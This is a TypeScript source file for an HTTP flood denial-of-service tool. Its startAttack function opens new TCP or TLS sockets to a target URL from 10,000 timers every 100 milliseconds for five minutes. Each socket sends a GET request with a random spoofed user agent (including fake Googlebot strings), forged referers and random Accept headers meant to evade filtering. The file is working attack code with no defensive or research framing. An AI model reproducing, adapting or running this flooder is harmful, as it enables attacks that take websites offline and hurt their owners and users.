import net from 'net';
import tls from 'tls';
import { URL } from 'url';

const abcd = 'asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM';
const acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
];

const referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?auto=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
];

const getRandomUserAgent = () => {
    const choices = ["Macintosh", "Windows", "X11"];
    const osChoices = {
        Macintosh: ["68K", "PPC", "Intel Mac OS X"],
        Windows: ["Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"],
        X11: ["Linux i686", "Linux x86_64"]
    };
    const browserChoices = ["chrome", "spider", "ie"];

    const platform = choices[Math.floor(Math.random() * choices.length)];
    const os = osChoices[platform][Math.floor(Math.random() * osChoices[platform].length)];
    const browser = browserChoices[Math.floor(Math.random() * browserChoices.length)];

    if (browser === "chrome") {
        const webkit = (Math.floor(Math.random() * 99) + 500).toString();
        const version = `${Math.floor(Math.random() * 99)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)}`;
        return `Mozilla/5.0 (${os}) AppleWebKit/${webkit}.0 (KHTML, like Gecko) Chrome/${version} Safari/${webkit}`;
    } else if (browser === "ie") {
        const version = `${Math.floor(Math.random() * 99)}.0`;
        const engine = `${Math.floor(Math.random() * 99)}.0`;
        return `Mozilla/5.0 (compatible; MSIE ${version}; ${os}; Trident/${engine})`;
    } else {
        const spiders = [
            "AdsBot-Google (http://www.google.com/adsbot.html)",
            "Baiduspider (http://www.baidu.com/search/spider.htm)",
            "FeedFetcher-Google; (http://www.google.com/feedfetcher.html)",
            "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
            "Googlebot-Image/1.0",
            "Googlebot-News",
            "Googlebot-Video/1.0",
        ];
        return spiders[Math.floor(Math.random() * spiders.length)];
    }
};

const createRequest = (host: string, path: string) => {
    const userAgent = getRandomUserAgent();
    const referer = referers[Math.floor(Math.random() * referers.length)];
    const accept = acceptall[Math.floor(Math.random() * acceptall.length)];

    return `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: ${accept}\r\nReferer: ${referer}\r\nConnection: Keep-Alive\r\n\r\n`;
};

let isAttacking = false;

export const startAttack = (targetUrl: string, log: (message: string) => void) => {
    const url = new URL(targetUrl);
    const host = url.hostname;
    const port = url.port || (url.protocol === 'https:' ? '443' : '80');
    const path = url.pathname || '/';

    isAttacking = true;

    const threads = 10000; 
    const duration = 300 * 1000; 

    for (let i = 0; i < threads; i++) {
        setTimeout(() => {
            const attack = () => {
                if (!isAttacking) return;

                const socket = port === '443' ? tls.connect({ host, port, rejectUnauthorized: false }) : net.connect({ host, port });

                socket.on('connect', () => {
                    const request = createRequest(host, path);
                    socket.write(request);
                    log(`Thread ${i + 1}: Connected to ${host}:${port}`);
                });

                socket.on('error', (err) => {
                    log(`Thread ${i + 1}: Error - ${err.message}`);
                });

                socket.on('close', () => {
                    log(`Thread ${i + 1}: Connection closed`);
                });
            };

            setInterval(attack, 100);
        }, i * 100);
    }

    log(`Attack started on ${targetUrl} with ${threads} threads`);

    setTimeout(() => {
        stopAttack();
        log(`Attack stopped after 300 seconds.`);
    }, duration);
};

export const stopAttack = () => {
    isAttacking = false;
};
